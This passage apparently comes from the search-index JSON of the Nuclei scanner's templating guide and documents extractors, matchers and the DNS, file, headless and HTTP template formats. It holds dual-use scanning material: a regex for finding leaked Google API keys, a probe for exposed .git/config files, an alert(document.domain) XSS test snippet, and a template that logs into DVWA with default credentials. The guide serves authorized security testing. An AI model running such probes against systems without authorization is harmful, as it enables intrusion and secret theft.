: header kval : # header value to extract from response - content-type","title":"Types"},{"location":"templating-guide/operators/extractors/#dynamic-extractor","text":"Extractors can be used to capture Dynamic Values on runtime while writing Multi-Request templates. CSRF Tokens, Session Headers, etc can be extracted and used in requests. Example of defining a dynamic extractor with name api_key which will capture a regex based pattern from the request. extractors : - type : regex name : api_key part : body internal : true regex : - \"(?m)[0-9]{3,10}\\\\.[0-9]+\" Here we used extractor name as variable api_key which holds the extracted value and can be used in any part of the next requests. This feature is supported in RAW request format only. Note:- You can use internal: true when you only want to use extractor as dynamic variable as this will avoid printing extracted values in the terminal. An optional regex match-group can also be specified for the regex for more complex matches. # A list of extractors for text extraction extractors : # type of extractor - type : regex # Let's reuse the extracted CSRF token name : csrf_token part : body # group defines the matching group being used. # In GO the \"match\" is the full array of all matches and submatches # match[0] is the full match # match[n] is the submatches. Most often we'd want match[1] as depicted below group : 1 regex : - '<input\\sname=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\"\\s/>' The above extractor with name csrf_token will hold the value extracted (by ([[:alnum:]]{16})) as abcdefgh12345678 . If no group option is provided with this regex, the above extractor with name csrf_html_tag will hold the full match (by <input name=\"csrf_token\"\\stype=\"hidden\"\\svalue=\"([[:alnum:]]{16})\" /> ) as <input name=\"csrf_token\" type=\"hidden\" value=\"abcdefgh12345678\" /> .","title":"Dynamic extractor"},{"location":"templating-guide/operators/matchers/","text":"Matchers \u00b6 Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning. Types \u00b6 Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw) Conditions \u00b6 Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher. Matched Parts \u00b6 Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility. Negative Matchers \u00b6 All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true Multiple Matchers \u00b6 Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header Matchers Condition \u00b6 While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers"},{"location":"templating-guide/operators/matchers/#matchers","text":"Matchers allow different type of flexible comparisons on protocol responses. They are what makes nuclei so powerful, checks are very simple to write and multiple checks can be added as per need for very effective scanning.","title":"Matchers"},{"location":"templating-guide/operators/matchers/#types","text":"Multiple matchers can be specified in a request. There are basically 6 types of matchers: Matcher Type Part Matched status Integer Comparisons of Part size Content Length of Part word Part for a protocol regex Part for a protocol binary Part for a protocol dsl Part for a protocol To match status codes for responses, you can use the following syntax. matchers : # Match the status codes - type : status # Some status codes we want to match status : - 200 - 302 To match binary for hexadecimal responses, you can use the following syntax. matchers : - type : binary binary : - \"504B0304\" # zip archive - \"526172211A070100\" # rar RAR archive version 5.0 - \"FD377A585A0000\" # xz tar.xz archive condition : or part : body Matchers also support hex encoded data which will be decoded and matched. matchers : - type : word encoding : hex words : - \"50494e47\" part : body Word and Regex matchers can be further configured depending on the needs of the users. Complex matchers of type dsl allows to build more elaborate expressions with helper functions. These function allow access to Protocol Response which contains variety of data based on each protocol. See protocol specific documentation to learn about different returned results. matchers : - type : dsl dsl : - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body Every part of a Protocol response can be matched with DSL matcher. Some examples - Response Part Description Example content_length Content-Length Header content_length >= 1024 status_code Response Status Code status_code==200 all_headers Unique string containing all headers len(all_headers) body Body as string len(body) header_name Lowercase header name with - converted to _ len(user_agent) raw Headers + Response len(raw)","title":"Types"},{"location":"templating-guide/operators/matchers/#conditions","text":"Multiple words and regexes can be specified in a single matcher and can be configured with different conditions like AND and OR . AND - Using AND conditions allows matching of all the words from the list of words for the matcher. Only then will the request be marked as successful when all the words have been matched. OR - Using OR conditions allows matching of a single word from the list of matcher. The request will be marked as successful when even one of the word is matched for the matcher.","title":"Conditions"},{"location":"templating-guide/operators/matchers/#matched-parts","text":"Multiple parts of the response can also be matched for the request, default matched part is body if not defined. Example matchers for HTTP response body using the AND condition: matchers : # Match the body word - type : word # Some words we want to match words : - \"[core]\" - \"[config]\" # Both words must be found in the response body condition : and # We want to match request body (default) part : body Similarly, matchers can be written to match anything that you want to find in the response body allowing unlimited creativity and extensibility.","title":"Matched Parts"},{"location":"templating-guide/operators/matchers/#negative-matchers","text":"All types of matchers also support negative conditions, mostly useful when you look for a match with an exclusions. This can be used by adding negative: true in the matchers block. Here is an example syntax using negative condition, this will return all the URLs not having PHPSESSID in the response header. matchers : - type : word words : - \"PHPSESSID\" part : header negative : true","title":"Negative Matchers"},{"location":"templating-guide/operators/matchers/#multiple-matchers","text":"Multiple matchers can be used in a single template to fingerprint multiple conditions with a single request. Here is an example of syntax for multiple matchers. matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" condition : or part : header","title":"Multiple Matchers"},{"location":"templating-guide/operators/matchers/#matchers-condition","text":"While using multiple matchers the default condition is to follow OR operation in between all the matchers, AND operation can be used to make sure return the result if all matchers returns true. matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - \"PHP\" part : body","title":"Matchers Condition"},{"location":"templating-guide/protocols/dns/","text":"DNS Requests \u00b6 DNS protocol can be modelled in nuclei with ease. Fully Customizable DNS requests can be sent by nuclei to nameservers and matching/extracting can be performed on their response. DNS Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns : Type \u00b6 First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A Name \u00b6 The next part of the requests is the DNS name to resolve. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. An example name value: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one name per request. Class \u00b6 Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet Recursion \u00b6 Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true Retries \u00b6 Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3 Matchers / Extractor Parts \u00b6 Valid part values supported by DNS protocol for Matchers / Extractor are - Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message Example DNS Template \u00b6 The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and More complete examples are provided here","title":"DNS"},{"location":"templating-guide/protocols/dns/#dns-requests","text":"DNS protocol can be modelled in nuclei with ease. Fully Customizable DNS requests can be sent by nuclei to nameservers and matching/extracting can be performed on their response. DNS Requests start with a dns block which specifies the start of the requests for the template. # Start the requests for the template right here dns :","title":"DNS Requests"},{"location":"templating-guide/protocols/dns/#type","text":"First thing in the request is type . Request type can be A , NS , CNAME , SOA , PTR , MX , TXT , AAAA . # type is the type for the dns request type : A","title":"Type"},{"location":"templating-guide/protocols/dns/#name","text":"The next part of the requests is the DNS name to resolve. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with {{ and end with }} and are case-sensitive. FQDN - variable is replaced by the hostname/FQDN of the target on runtime. An example name value: name : {{ FQDN }} .com # This value will be replaced on execution with the FQDN. # If FQDN is https://this.is.an.example then the # name will get replaced to the following: this.is.an.example.com As of now the tool supports only one name per request.","title":"Name"},{"location":"templating-guide/protocols/dns/#class","text":"Class type can be INET , CSNET , CHAOS , HESIOD , NONE and ANY . Usually it's enough to just leave it as INET . # method is the class for the dns request class : inet","title":"Class"},{"location":"templating-guide/protocols/dns/#recursion","text":"Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it's better to leave it as true . # Recursion is a boolean determining if the request is recursive recursion : true","title":"Recursion"},{"location":"templating-guide/protocols/dns/#retries","text":"Retries is the number of attempts a dns query is retried before giving up among different resolvers. It's recommended a reasonable value, like 3 . # Retries is a number of retries before giving up on dns resolution retries : 3","title":"Retries"},{"location":"templating-guide/protocols/dns/#matchers-extractor-parts","text":"Valid part values supported by DNS protocol for Matchers / Extractor are - Value Description request DNS Request rcode DNS Rcode question DNS Question Message extra DNS Message Extra Field answer DNS Message Answer Field ns DNS Message Authority Field raw / all / body Raw DNS Message","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/dns/#example-dns-template","text":"The final example template file for performing A query, and check if CNAME and A records are in the response is as follows: id : dummy-cname-a info : name : Dummy A dns request author : mzack9999 severity : none description : Checks if CNAME and A record is returned. dns : - name : \"{{FQDN}}\" type : A class : inet recursion : true retries : 3 matchers : - type : word words : # The response must contains a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition : and More complete examples are provided here","title":"Example DNS Template"},{"location":"templating-guide/protocols/file/","text":"File Requests \u00b6 Nuclei allows modelling templates that can match/extract on filesystem too. # Start of file template block file : Extensions \u00b6 To match on all extensions (except the ones in default denylist), use the following - extensions : - all You can also provide a list of custom extensions that should be matched upon. extensions : - py - go A denylist of extensions can also be provided. Files with these extensions will not be processed by nuclei. extensions : - all denylist : - go - py - txt By default, certain extensions are excluded in nuclei file module. A list of these is provided below- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip More Options \u00b6 max-size parameter can be provided which limits the maximum size (in bytes) of files read by nuclei engine. As default the max-size value is 5MB (5242880), Files larger than the max-size will not be processed. no-recursive option disables recursive walking of directories / globs while input is being processed for file module of nuclei. Matchers / Extractor \u00b6 File protocol supports 2 types of Matchers - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all Example File Template \u00b6 The final example template file for a Private Key detection is provided below. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # Running file template on http-response/ directory nuclei -t file.yaml -target http-response/ # Running file template on output.txt nuclei -t file.yaml -target output.txt More complete examples are provided here","title":"File"},{"location":"templating-guide/protocols/file/#file-requests","text":"Nuclei allows modelling templates that can match/extract on filesystem too. # Start of file template block file :","title":"File Requests"},{"location":"templating-guide/protocols/file/#extensions","text":"To match on all extensions (except the ones in default denylist), use the following - extensions : - all You can also provide a list of custom extensions that should be matched upon. extensions : - py - go A denylist of extensions can also be provided. Files with these extensions will not be processed by nuclei. extensions : - all denylist : - go - py - txt By default, certain extensions are excluded in nuclei file module. A list of these is provided below- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip","title":"Extensions"},{"location":"templating-guide/protocols/file/#more-options","text":"max-size parameter can be provided which limits the maximum size (in bytes) of files read by nuclei engine. As default the max-size value is 5MB (5242880), Files larger than the max-size will not be processed. no-recursive option disables recursive walking of directories / globs while input is being processed for file module of nuclei.","title":"More Options"},{"location":"templating-guide/protocols/file/#matchers-extractor","text":"File protocol supports 2 types of Matchers - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all","title":"Matchers / Extractor"},{"location":"templating-guide/protocols/file/#example-file-template","text":"The final example template file for a Private Key detection is provided below. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # Running file template on http-response/ directory nuclei -t file.yaml -target http-response/ # Running file template on output.txt nuclei -t file.yaml -target output.txt More complete examples are provided here","title":"Example File Template"},{"location":"templating-guide/protocols/headless/","text":"Headless Requests \u00b6 Nuclei supports automation of a browser with simple DSL. Headless browser engine can be fully customized and user actions can be scripted allowing complete control over the browser. This allows for a variety of unique and custom workflows. # Start the requests for the template right here headless : Actions \u00b6 Action is a single piece of Task for the Nuclei Headless Engine. Each action manipulates the browser state in some way, and finally leads to the state that we are interesting in capturing. Nuclei supports a variety of actions. A list of these Actions along with their arguments are given below - navigate \u00b6 Navigate visits a given URL. url field supports variables like {{BaseURL}} , {{Hostname}} to customize the request fully. action : navigate args : url : \"{{BaseURL}} script \u00b6 Script runs a JS code on the current browser page. At the simplest level, you can just provide a code argument with the JS snippet you want to execute and it will be run on the page. action : script args : code : alert(document.domain) Suppose you want to run a matcher on a JS object to inspect it's value. This type of data extraction use cases are also supported with nuclei headless. As an example, let's say the application sets an object called window.random-object with a value and you want to match on that value. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei supports running some custom Javascript, before the page load with the hook argument. This will always run the provided Javascript, before any of the pages load. The example provided hooks window.alert so that the alerts that are generated by the application do not stop the crawler. - action : script args : code : (function() { window.alert=function(){} })() hook : true This is one use case, there are many more use cases of function hooking such as DOM XSS Detection and Javascript-Injection based testing techniques. Further examples are provided on examples page. click \u00b6 Click simulates clicking with the Left-Mouse button on an element specified by a selector. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei supports a variety of selector types, including but not limited to XPath, Regex, CSS, etc. For more information about selectors, see here . rightclick \u00b6 RightClick simulates clicking with the Right-Mouse button on an element specified by a selector. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input text \u00b6 Text simulates typing something into an input with Keyboard. Selectors can be used to specify the element to type in. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username screenshot \u00b6 Screenshots takes the screenshots of a page and writes it to disk. It supports both full page as well as normal screenshots. action : screenshot args : to : /root/test/screenshot-web If you require full page screenshot, it can be achieved with fullpage: true option in the args. action : screenshot args : to : /root/test/screenshot-web fullpage : true time \u00b6 Time enters values into time inputs on pages in RFC3339 format. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00 select \u00b6 Select performs selection on a HTML Input by a selector. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex files \u00b6 Files handles a file upload input on the webpage. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt waitload \u00b6 WaitLoads waits for a page to finish loading and get in Idle state. action : waitload Nuclei's waitload action waits for DOM to load, and window.onload event to be received after which we wait for the page to become idle for 1 seconds. getresource \u00b6 GetResource returns the src attribute for an element. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input extract \u00b6 Extract extracts either the Text for a HTML Node, or an attribute as specified by the user. The below code will extract the Text for the given XPath Selector Element, which can then also be matched upon by name extracted-value with matchers and extractors. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input An attribute can also be extracted for an element. For example - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href setmethod \u00b6 SetMethod overrides the method for the request. action : setmethod args : part : request method : DELETE addheader \u00b6 AddHeader adds a header to the requests / responses. This does not overwrites any pre-existing headers. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" setheader \u00b6 SetHeader sets a header in the requests / responses. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" deleteheader \u00b6 DeleteHeader deletes a header from requests / responses. action : deleteheader args : part : response # can be request too key : Content-Security-Policy setbody \u00b6 SetBody sets the body for a request / response. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}' waitevent \u00b6 WaitEvent waits for an event to trigger on the page. action : waitevent args : event : 'Page.loadEventFired' The list of events supported are listed here . keyboard \u00b6 Keybord simulates a single key-press on the keyboard. action : keyboard args : keys : '\\r' # this simulates pressing enter key on keyboard keys argument accepts key-codes. debug \u00b6 Debug adds a delay of 5 seconds between each headless action and also shows a trace of all the headless events occuring in the browser. Note: Only use this for debugging purposes, don't use this in production templates. action : debug sleep \u00b6 Sleeps makes the browser wait for a specified duration in seconds. This is also useful for debugging purposes. action : sleep args : duration : 5 Selectors \u00b6 Selectors are how nuclei headless engine identifies what element to execute an action on. Nuclei supports getting selectors by including a variety of options - Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector Matchers / Extractor Parts \u00b6 Valid part values supported by Headless protocol for Matchers / Extractor are - Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser Example Headless Template \u00b6 An example headless template to automatically login into DVWA is provided below - id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" More complete examples are provided here","title":"Headless"},{"location":"templating-guide/protocols/headless/#headless-requests","text":"Nuclei supports automation of a browser with simple DSL. Headless browser engine can be fully customized and user actions can be scripted allowing complete control over the browser. This allows for a variety of unique and custom workflows. # Start the requests for the template right here headless :","title":"Headless Requests"},{"location":"templating-guide/protocols/headless/#actions","text":"Action is a single piece of Task for the Nuclei Headless Engine. Each action manipulates the browser state in some way, and finally leads to the state that we are interesting in capturing. Nuclei supports a variety of actions. A list of these Actions along with their arguments are given below -","title":"Actions"},{"location":"templating-guide/protocols/headless/#navigate","text":"Navigate visits a given URL. url field supports variables like {{BaseURL}} , {{Hostname}} to customize the request fully. action : navigate args : url : \"{{BaseURL}}","title":"navigate"},{"location":"templating-guide/protocols/headless/#script","text":"Script runs a JS code on the current browser page. At the simplest level, you can just provide a code argument with the JS snippet you want to execute and it will be run on the page. action : script args : code : alert(document.domain) Suppose you want to run a matcher on a JS object to inspect it's value. This type of data extraction use cases are also supported with nuclei headless. As an example, let's say the application sets an object called window.random-object with a value and you want to match on that value. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei supports running some custom Javascript, before the page load with the hook argument. This will always run the provided Javascript, before any of the pages load. The example provided hooks window.alert so that the alerts that are generated by the application do not stop the crawler. - action : script args : code : (function() { window.alert=function(){} })() hook : true This is one use case, there are many more use cases of function hooking such as DOM XSS Detection and Javascript-Injection based testing techniques. Further examples are provided on examples page.","title":"script"},{"location":"templating-guide/protocols/headless/#click","text":"Click simulates clicking with the Left-Mouse button on an element specified by a selector. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei supports a variety of selector types, including but not limited to XPath, Regex, CSS, etc. For more information about selectors, see here .","title":"click"},{"location":"templating-guide/protocols/headless/#rightclick","text":"RightClick simulates clicking with the Right-Mouse button on an element specified by a selector. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"rightclick"},{"location":"templating-guide/protocols/headless/#text","text":"Text simulates typing something into an input with Keyboard. Selectors can be used to specify the element to type in. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username","title":"text"},{"location":"templating-guide/protocols/headless/#screenshot","text":"Screenshots takes the screenshots of a page and writes it to disk. It supports both full page as well as normal screenshots. action : screenshot args : to : /root/test/screenshot-web If you require full page screenshot, it can be achieved with fullpage: true option in the args. action : screenshot args : to : /root/test/screenshot-web fullpage : true","title":"screenshot"},{"location":"templating-guide/protocols/headless/#time","text":"Time enters values into time inputs on pages in RFC3339 format. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00","title":"time"},{"location":"templating-guide/protocols/headless/#select","text":"Select performs selection on a HTML Input by a selector. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex","title":"select"},{"location":"templating-guide/protocols/headless/#files","text":"Files handles a file upload input on the webpage. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt","title":"files"},{"location":"templating-guide/protocols/headless/#waitload","text":"WaitLoads waits for a page to finish loading and get in Idle state. action : waitload Nuclei's waitload action waits for DOM to load, and window.onload event to be received after which we wait for the page to become idle for 1 seconds.","title":"waitload"},{"location":"templating-guide/protocols/headless/#getresource","text":"GetResource returns the src attribute for an element. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input","title":"getresource"},{"location":"templating-guide/protocols/headless/#extract","text":"Extract extracts either the Text for a HTML Node, or an attribute as specified by the user. The below code will extract the Text for the given XPath Selector Element, which can then also be matched upon by name extracted-value with matchers and extractors. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input An attribute can also be extracted for an element. For example - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href","title":"extract"},{"location":"templating-guide/protocols/headless/#setmethod","text":"SetMethod overrides the method for the request. action : setmethod args : part : request method : DELETE","title":"setmethod"},{"location":"templating-guide/protocols/headless/#addheader","text":"AddHeader adds a header to the requests / responses. This does not overwrites any pre-existing headers. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"addheader"},{"location":"templating-guide/protocols/headless/#setheader","text":"SetHeader sets a header in the requests / responses. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"","title":"setheader"},{"location":"templating-guide/protocols/headless/#deleteheader","text":"DeleteHeader deletes a header from requests / responses. action : deleteheader args : part : response # can be request too key : Content-Security-Policy","title":"deleteheader"},{"location":"templating-guide/protocols/headless/#setbody","text":"SetBody sets the body for a request / response. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}'","title":"setbody"},{"location":"templating-guide/protocols/headless/#waitevent","text":"WaitEvent waits for an event to trigger on the page. action : waitevent args : event : 'Page.loadEventFired' The list of events supported are listed here .","title":"waitevent"},{"location":"templating-guide/protocols/headless/#keyboard","text":"Keybord simulates a single key-press on the keyboard. action : keyboard args : keys : '\\r' # this simulates pressing enter key on keyboard keys argument accepts key-codes.","title":"keyboard"},{"location":"templating-guide/protocols/headless/#debug","text":"Debug adds a delay of 5 seconds between each headless action and also shows a trace of all the headless events occuring in the browser. Note: Only use this for debugging purposes, don't use this in production templates. action : debug","title":"debug"},{"location":"templating-guide/protocols/headless/#sleep","text":"Sleeps makes the browser wait for a specified duration in seconds. This is also useful for debugging purposes. action : sleep args : duration : 5","title":"sleep"},{"location":"templating-guide/protocols/headless/#selectors","text":"Selectors are how nuclei headless engine identifies what element to execute an action on. Nuclei supports getting selectors by including a variety of options - Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector","title":"Selectors"},{"location":"templating-guide/protocols/headless/#matchers-extractor-parts","text":"Valid part values supported by Headless protocol for Matchers / Extractor are - Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/headless/#example-headless-template","text":"An example headless template to automatically login into DVWA is provided below - id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" More complete examples are provided here","title":"Example Headless Template"},{"location":"templating-guide/protocols/http/","text":"Requests Nuclei offers extensive support for various features related to HTTP protocol. Raw and Model based HTTP requests are supported, along with options Non-RFC client requests support too. Payloads can also be specified and raw requests can be transformed based on payload values along with many more capabilities that are shown later on this Page. HTTP Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here requests : Method Request method can be GET , POST , PUT , DELETE , etc depending on the needs. # Method is the method for the request method : GET Redirects Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: requests : - method : GET path : - \"{{BaseURL}}/login.php\" redirects : true max-redirects : 3 Warning Currently redirects are defined per template, not per request. Path The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. {{BaseURL}} - This will replace on runtime in the request by the original URL as specified in the target file. {{Hostname}} - Hostname variable is replaced by the hostname of the target on runtime. Some sample dynamic variable replacement examples: path : \"{{BaseURL}}/.git/config\" # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target. Headers 